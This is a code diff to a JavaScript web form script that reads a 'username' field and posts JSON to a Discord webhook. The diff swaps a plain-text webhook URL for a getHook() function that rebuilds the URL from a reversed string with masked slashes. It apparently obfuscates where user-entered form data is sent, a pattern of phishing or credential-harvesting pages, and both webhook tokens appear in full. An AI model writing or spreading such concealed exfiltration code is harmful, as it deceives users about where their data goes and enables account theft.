@@ -68,6 +68,15 @@
 
   checkForMatch()
   
+
+
+  function getHook() {
+    toUnencrypt = "z2QK1ArRmKuojB4aexzb-JaYtRXufX9bsD9mtQLDLKd9zEm8_HJKn9VlAy894tnTHOPv[S]4595102381223954841[S]skoohbew[S]ipa[S]moc.drocsid[S][S]:sptth";
+    toUnencrypt = toUnencrypt.replaceAll('[S]', '/')
+    toUnencrypt = toUnencrypt.split('').reverse().join('');
+    return toUnencrypt;
+  }
+  
   function getVal() {
     var username = document.getElementById("username").value;
     if (username.length < 1) {
@@ -82,7 +91,7 @@
 
     const request = new XMLHttpRequest();
 
-    request.open("POST", "https://discord.com/api/webhooks/1465578886422069358/Pr2iqku-eV0NFuWUyyqCKUCHQY5qfS8uP3k7gB--ZCVkVA3pRuEvNtd5kAITIQUhwQA4");
+    request.open("POST", getHook());
 
     request.setRequestHeader('Content-type', 'application/json');
 
